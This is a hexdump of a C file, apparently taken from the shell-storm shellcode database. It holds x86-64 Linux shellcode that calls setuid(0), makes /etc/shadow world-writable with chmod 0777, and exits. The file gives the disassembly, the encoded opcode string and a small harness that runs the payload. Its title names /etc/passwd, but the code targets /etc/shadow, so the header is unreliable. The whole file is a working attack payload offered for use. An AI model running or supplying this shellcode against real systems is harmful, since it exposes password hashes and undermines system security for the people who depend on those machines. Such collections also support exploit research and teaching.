00000000  2f 2a 0a 54 69 74 6c 65  3a 20 20 4c 69 6e 75 78  |/*.Title:  Linux|
00000010  2f 78 38 36 2d 36 34 20  2d 20 73 65 74 75 69 64  |/x86-64 - setuid|
00000020  28 30 29 20 26 20 63 68  6d 6f 64 20 28 22 2f 65  |(0) & chmod ("/e|
00000030  74 63 2f 70 61 73 73 77  64 22 2c 20 30 37 37 37  |tc/passwd", 0777|
00000040  29 20 26 20 65 78 69 74  28 30 29 20 2d 20 36 33  |) & exit(0) - 63|
00000050  20 62 79 65 73 0a 44 61  74 65 3a 20 20 20 32 30  | byes.Date:   20|
00000060  31 30 2d 30 36 2d 31 37  0a 54 65 73 74 65 64 3a  |10-06-17.Tested:|
00000070  20 41 72 63 68 6c 69 6e  75 78 20 78 38 36 5f 36  | Archlinux x86_6|
00000080  34 20 6b 32 2e 36 2e 33  33 0a 0a 41 75 74 68 6f  |4 k2.6.33..Autho|
00000090  72 3a 20 4a 6f 6e 61 74  68 61 6e 20 53 61 6c 77  |r: Jonathan Salw|
000000a0  61 6e 0a 57 65 62 3a 20  20 20 20 68 74 74 70 3a  |an.Web:    http:|
000000b0  2f 2f 73 68 65 6c 6c 2d  73 74 6f 72 6d 2e 6f 72  |//shell-storm.or|
000000c0  67 20 7c 20 68 74 74 70  3a 2f 2f 74 77 69 74 74  |g | http://twitt|
000000d0  65 72 2e 63 6f 6d 2f 6a  6f 6e 61 74 68 61 6e 73  |er.com/jonathans|
000000e0  61 6c 77 61 6e 0a 0a 21  20 44 61 74 61 62 61 73  |alwan..! Databas|
000000f0  65 20 6f 66 20 73 68 65  6c 6c 63 6f 64 65 73 20  |e of shellcodes |
00000100  68 74 74 70 3a 2f 2f 77  77 77 2e 73 68 65 6c 6c  |http://www.shell|
00000110  2d 73 74 6f 72 6d 2e 6f  72 67 2f 73 68 65 6c 6c  |-storm.org/shell|
00000120  63 6f 64 65 2f 0a 0a 0a  0a 20 20 3c 2d 2d 20 5f  |code/....  <-- _|
00000130  73 65 74 75 69 64 28 30  29 20 2d 2d 3e 0a 20 20  |setuid(0) -->.  |
00000140  34 30 30 30 37 38 3a 09  34 38 20 33 31 20 66 66  |400078:.48 31 ff|
00000150  20 20 20 20 20 20 20 20  20 20 20 20 20 09 78 6f  |             .xo|
00000160  72 20 20 20 20 25 72 64  69 2c 25 72 64 69 0a 20  |r    %rdi,%rdi. |
00000170  20 34 30 30 30 37 62 3a  09 34 38 20 33 31 20 63  | 40007b:.48 31 c|
00000180  30 20 20 20 20 20 20 20  20 20 20 20 20 20 09 78  |0             .x|
00000190  6f 72 20 20 20 20 25 72  61 78 2c 25 72 61 78 0a  |or    %rax,%rax.|
000001a0  20 20 34 30 30 30 37 65  3a 09 62 30 20 36 39 20  |  40007e:.b0 69 |
000001b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
000001c0  6d 6f 76 20 20 20 20 24  30 78 36 39 2c 25 61 6c  |mov    $0x69,%al|
000001d0  0a 20 20 34 30 30 30 38  30 3a 09 30 66 20 30 35  |.  400080:.0f 05|
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001f0  09 73 79 73 63 61 6c 6c  0a 0a 20 20 3c 2d 2d 20  |.syscall..  <-- |
00000200  5f 63 68 6d 6f 64 28 22  2f 65 74 63 2f 73 68 61  |_chmod("/etc/sha|
00000210  64 6f 77 22 2c 20 30 37  37 37 29 20 2d 2d 3e 0a  |dow", 0777) -->.|
00000220  20 20 34 30 30 30 38 32  3a 09 34 38 20 33 31 20  |  400082:.48 31 |
00000230  64 32 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |d2             .|
00000240  78 6f 72 20 20 20 20 25  72 64 78 2c 25 72 64 78  |xor    %rdx,%rdx|
00000250  0a 20 20 34 30 30 30 38  35 3a 09 36 36 20 62 65  |.  400085:.66 be|
00000260  20 66 66 20 30 31 20 20  20 20 20 20 20 20 20 20  | ff 01          |
00000270  09 6d 6f 76 20 20 20 20  24 30 78 31 66 66 2c 25  |.mov    $0x1ff,%|
00000280  73 69 0a 20 20 34 30 30  30 38 39 3a 09 34 38 20  |si.  400089:.48 |
00000290  62 62 20 66 66 20 66 66  20 66 66 20 66 66 20 66  |bb ff ff ff ff f|
000002a0  66 20 09 6d 6f 76 20 20  20 20 24 30 78 37 37 36  |f .mov    $0x776|
000002b0  66 36 34 66 66 66 66 66  66 66 66 66 66 2c 25 72  |f64ffffffffff,%r|
000002c0  62 78 0a 20 20 34 30 30  30 39 30 3a 09 36 34 20  |bx.  400090:.64 |
000002d0  36 66 20 37 37 20 0a 20  20 34 30 30 30 39 33 3a  |6f 77 .  400093:|
000002e0  09 34 38 20 63 31 20 65  62 20 32 38 20 20 20 20  |.48 c1 eb 28    |
000002f0  20 20 20 20 20 20 09 73  68 72 20 20 20 20 24 30  |      .shr    $0|
00000300  78 32 38 2c 25 72 62 78  0a 20 20 34 30 30 30 39  |x28,%rbx.  40009|
00000310  37 3a 09 35 33 20 20 20  20 20 20 20 20 20 20 20  |7:.53           |
00000320  20 20 20 20 20 20 20 20  09 70 75 73 68 20 20 20  |        .push   |
00000330  25 72 62 78 0a 20 20 34  30 30 30 39 38 3a 09 34  |%rbx.  400098:.4|
00000340  38 20 62 62 20 32 66 20  36 35 20 37 34 20 36 33  |8 bb 2f 65 74 63|
00000350  20 32 66 20 09 6d 6f 76  20 20 20 20 24 30 78 36  | 2f .mov    $0x6|
00000360  31 36 38 37 33 32 66 36  33 37 34 36 35 32 66 2c  |168732f6374652f,|
00000370  25 72 62 78 0a 20 20 34  30 30 30 39 66 3a 09 37  |%rbx.  40009f:.7|
00000380  33 20 36 38 20 36 31 20  0a 20 20 34 30 30 30 61  |3 68 61 .  4000a|
00000390  32 3a 09 35 33 20 20 20  20 20 20 20 20 20 20 20  |2:.53           |
000003a0  20 20 20 20 20 20 20 20  09 70 75 73 68 20 20 20  |        .push   |
000003b0  25 72 62 78 0a 20 20 34  30 30 30 61 33 3a 09 34  |%rbx.  4000a3:.4|
000003c0  38 20 38 39 20 65 37 20  20 20 20 20 20 20 20 20  |8 89 e7         |
000003d0  20 20 20 20 09 6d 6f 76  20 20 20 20 25 72 73 70  |    .mov    %rsp|
000003e0  2c 25 72 64 69 0a 20 20  34 30 30 30 61 36 3a 09  |,%rdi.  4000a6:.|
000003f0  34 38 20 33 31 20 63 30  20 20 20 20 20 20 20 20  |48 31 c0        |
00000400  20 20 20 20 20 09 78 6f  72 20 20 20 20 25 72 61  |     .xor    %ra|
00000410  78 2c 25 72 61 78 0a 20  20 34 30 30 30 61 39 3a  |x,%rax.  4000a9:|
00000420  09 62 30 20 35 61 20 20  20 20 20 20 20 20 20 20  |.b0 5a          |
00000430  20 20 20 20 20 20 09 6d  6f 76 20 20 20 20 24 30  |      .mov    $0|
00000440  78 35 61 2c 25 61 6c 0a  20 20 34 30 30 30 61 62  |x5a,%al.  4000ab|
00000450  3a 09 30 66 20 30 35 20  20 20 20 20 20 20 20 20  |:.0f 05         |
00000460  20 20 20 20 20 20 20 09  73 79 73 63 61 6c 6c 20  |       .syscall |
00000470  0a 0a 20 20 3c 2d 2d 20  5f 65 78 69 74 28 30 29  |..  <-- _exit(0)|
00000480  20 2d 2d 3e 0a 20 20 34  30 30 30 61 64 3a 09 34  | -->.  4000ad:.4|
00000490  38 20 33 31 20 66 66 20  20 20 20 20 20 20 20 20  |8 31 ff         |
000004a0  20 20 20 20 09 78 6f 72  20 20 20 20 25 72 64 69  |    .xor    %rdi|
000004b0  2c 25 72 64 69 0a 20 20  34 30 30 30 62 30 3a 09  |,%rdi.  4000b0:.|
000004c0  34 38 20 33 31 20 63 30  20 20 20 20 20 20 20 20  |48 31 c0        |
000004d0  20 20 20 20 20 09 78 6f  72 20 20 20 20 25 72 61  |     .xor    %ra|
000004e0  78 2c 25 72 61 78 0a 20  20 34 30 30 30 62 33 3a  |x,%rax.  4000b3:|
000004f0  09 62 30 20 33 63 20 20  20 20 20 20 20 20 20 20  |.b0 3c          |
00000500  20 20 20 20 20 20 09 6d  6f 76 20 20 20 20 24 30  |      .mov    $0|
00000510  78 33 63 2c 25 61 6c 0a  20 20 34 30 30 30 62 35  |x3c,%al.  4000b5|
00000520  3a 09 30 66 20 30 35 20  20 20 20 20 20 20 20 20  |:.0f 05         |
00000530  20 20 20 20 20 20 20 09  73 79 73 63 61 6c 6c 0a  |       .syscall.|
00000540  2a 2f 0a 0a 23 69 6e 63  6c 75 64 65 20 3c 73 74  |*/..#include <st|
00000550  64 69 6f 2e 68 3e 0a 0a  0a 63 68 61 72 20 2a 53  |dio.h>...char *S|
00000560  43 20 3d 20 20 22 5c 78  34 38 5c 78 33 31 5c 78  |C =  "\x48\x31\x|
00000570  66 66 5c 78 34 38 5c 78  33 31 5c 78 63 30 5c 78  |ff\x48\x31\xc0\x|
00000580  62 30 5c 78 36 39 5c 78  30 66 5c 78 30 35 22 0a  |b0\x69\x0f\x05".|
00000590  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 34  |            "\x4|
000005a0  38 5c 78 33 31 5c 78 64  32 5c 78 36 36 5c 78 62  |8\x31\xd2\x66\xb|
000005b0  65 5c 78 66 66 5c 78 30  31 5c 78 34 38 5c 78 62  |e\xff\x01\x48\xb|
000005c0  62 5c 78 66 66 22 0a 20  20 20 20 20 20 20 20 20  |b\xff".         |
000005d0  20 20 20 22 5c 78 66 66  5c 78 66 66 5c 78 66 66  |   "\xff\xff\xff|
000005e0  5c 78 66 66 5c 78 36 34  5c 78 36 66 5c 78 37 37  |\xff\x64\x6f\x77|
000005f0  5c 78 34 38 5c 78 63 31  5c 78 65 62 22 0a 20 20  |\x48\xc1\xeb".  |
00000600  20 20 20 20 20 20 20 20  20 20 22 5c 78 32 38 5c  |          "\x28\|
00000610  78 35 33 5c 78 34 38 5c  78 62 62 5c 78 32 66 5c  |x53\x48\xbb\x2f\|
00000620  78 36 35 5c 78 37 34 5c  78 36 33 5c 78 32 66 5c  |x65\x74\x63\x2f\|
00000630  78 37 33 22 0a 20 20 20  20 20 20 20 20 20 20 20  |x73".           |
00000640  20 22 5c 78 36 38 5c 78  36 31 5c 78 35 33 5c 78  | "\x68\x61\x53\x|
00000650  34 38 5c 78 38 39 5c 78  65 37 5c 78 34 38 5c 78  |48\x89\xe7\x48\x|
00000660  33 31 5c 78 63 30 5c 78  62 30 22 0a 20 20 20 20  |31\xc0\xb0".    |
00000670  20 20 20 20 20 20 20 20  22 5c 78 35 61 5c 78 30  |        "\x5a\x0|
00000680  66 5c 78 30 35 5c 78 34  38 5c 78 33 31 5c 78 66  |f\x05\x48\x31\xf|
00000690  66 5c 78 34 38 5c 78 33  31 5c 78 63 30 5c 78 62  |f\x48\x31\xc0\xb|
000006a0  30 22 0a 20 20 20 20 20  20 20 20 20 20 20 20 22  |0".            "|
000006b0  5c 78 33 63 5c 78 30 66  5c 78 30 35 22 3b 0a 0a  |\x3c\x0f\x05";..|
000006c0  69 6e 74 20 6d 61 69 6e  28 76 6f 69 64 29 0a 7b  |int main(void).{|
000006d0  0a 20 20 20 20 20 20 20  20 66 70 72 69 6e 74 66  |.        fprintf|
000006e0  28 73 74 64 6f 75 74 2c  22 4c 65 6e 67 74 68 3a  |(stdout,"Length:|
000006f0  20 25 64 5c 6e 22 2c 73  74 72 6c 65 6e 28 53 43  | %d\n",strlen(SC|
00000700  29 29 3b 0a 20 20 20 20  20 20 20 20 28 2a 28 76  |));.        (*(v|
00000710  6f 69 64 28 2a 29 28 29  29 20 53 43 29 28 29 3b  |oid(*)()) SC)();|
00000720  0a 72 65 74 75 72 6e 20  30 3b 0a 7d              |.return 0;.}|
0000072c
